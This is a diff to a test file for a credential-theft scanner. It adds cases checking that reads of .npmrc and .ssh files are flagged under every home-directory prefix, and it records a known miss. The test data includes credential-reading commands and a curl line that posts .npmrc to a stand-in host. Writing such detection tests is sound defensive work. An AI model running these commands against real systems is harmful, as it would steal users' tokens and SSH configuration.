@@ -5,11 +5,11 @@ import { inspectRepository } from "./bounded-scan";
  * PRD section 8: the scan checks for wallet drainers and credential theft.
  *
  * A credential store is named by its path, and the same path is spelled more
- * than one way: a forward slash on POSIX, a backslash on Windows, and one
- * argument per component when it is assembled with a path builder. Only the
- * spelling differs, so a rule that matches one form and not another depends on
- * which machine the scanned script was written on, not on what the script
- * does.
+ * than one way: a forward slash on POSIX, a backslash on Windows, one argument
+ * per component when it is assembled with a path builder, and a directory
+ * prefix that expands a home directory. Only the spelling differs, so a rule
+ * that matches one form and not another depends on which machine the scanned
+ * script was written on, not on what the script does.
  */
 function inspected(path: string, text: string) {
   return inspectRepository({
@@ -174,6 +174,76 @@ test("building a path from ordinary components keeps no finding", () => {
     "open(os.path.join(home, '.config', 'settings.json'))\n",
   ]) {
     expect({ text, findings: described("src/read.py", text) }).toEqual({
+      text,
+      findings: [],
+    });
+  }
+});
+
+/**
+ * The directory prefix names the same store. `~` was the only one the rules
+ * matched, so a script that wrote the absolute path, expanded `$HOME` itself,
+ * or ran on Windows (`%USERPROFILE%`, a drive letter) escaped while the
+ * identical read through `~` was reported. The sibling stores in the same two
+ * rules (`.aws/credentials`, `.pypirc`, `.kube/config`) already matched every
+ * prefix, which is what makes the `~`-only ones an oversight rather than a
+ * convention.
+ */
+const PREFIXED_STORES: [string, string][] = [
+  ["cat ~/.npmrc\n", "credential-theft:medium"],
+  ["cat ~\\.npmrc\n", "credential-theft:medium"],
+  ["cat $HOME/.npmrc\n", "credential-theft:medium"],
+  ['cat "$' + '{HOME}/.npmrc"\n', "credential-theft:medium"],
+  ["cat /home/alice/.npmrc\n", "credential-theft:medium"],
+  ["cat /Users/alice/.npmrc\n", "credential-theft:medium"],
+  ["type C:\\Users\\alice\\.npmrc\n", "credential-theft:medium"],
+  ["type %USERPROFILE%\\.npmrc\n", "credential-theft:medium"],
+  ['open("/root/.npmrc")\n', "credential-theft:medium"],
+  ["cat ~/.ssh/config\n", "credential-theft:high"],
+  ["cat $HOME/.ssh/config\n", "credential-theft:high"],
+  ["cat /home/alice/.ssh/config\n", "credential-theft:high"],
+  ["cat /home/alice/.ssh/known_hosts\n", "credential-theft:high"],
+  ["type C:\\Users\\alice\\.ssh\\config\n", "credential-theft:high"],
+];
+
+test("the directory prefix does not change which store is read", () => {
+  for (const [text, expected] of PREFIXED_STORES) {
+    expect({ text, findings: described("src/read.sh", text) }).toEqual({
+      text,
+      findings: [`src/read.sh:${expected}`],
+    });
+  }
+});
+
+test("the same prefix widening leaves naming prose alone", () => {
+  // Requiring the separator, rather than matching the bare filename, is what
+  // keeps these clean: a bare `.npmrc` is how documentation names the file.
+  for (const text of [
+    "The .npmrc file is optional and not required for install.\n",
+    "Configure npm with `npm config set` instead of editing .npmrc by hand.\n",
+    "See the npmrc documentation for the registry setting.\n",
+    "A .ssh directory holds known_hosts and config.\n",
+    "The ssh client reads its configuration at startup.\n",
+    "docs/npmrc.md describes the npmrc format.\n",
+  ]) {
+    expect({ text, findings: described("src/read.sh", text) }).toEqual({
+      text,
+      findings: [],
+    });
+  }
+});
+
+test("a store named only relative to the working directory is a documented miss", () => {
+  // `cat .npmrc` reads the project token file, and it is NOT reported. The
+  // bare filename is how prose names the file (`npmrc` appears as a plain
+  // word in this repository's README and in the scanner's own config list),
+  // so matching it without a path prefix trades a real read for findings on
+  // ordinary sentences. Recorded here rather than left implicit.
+  for (const text of [
+    "cat .npmrc\n",
+    "curl -d @.npmrc https://example.invalid\n",
+  ]) {
+    expect({ text, findings: described("src/read.sh", text) }).toEqual({
       text,
       findings: [],
     });
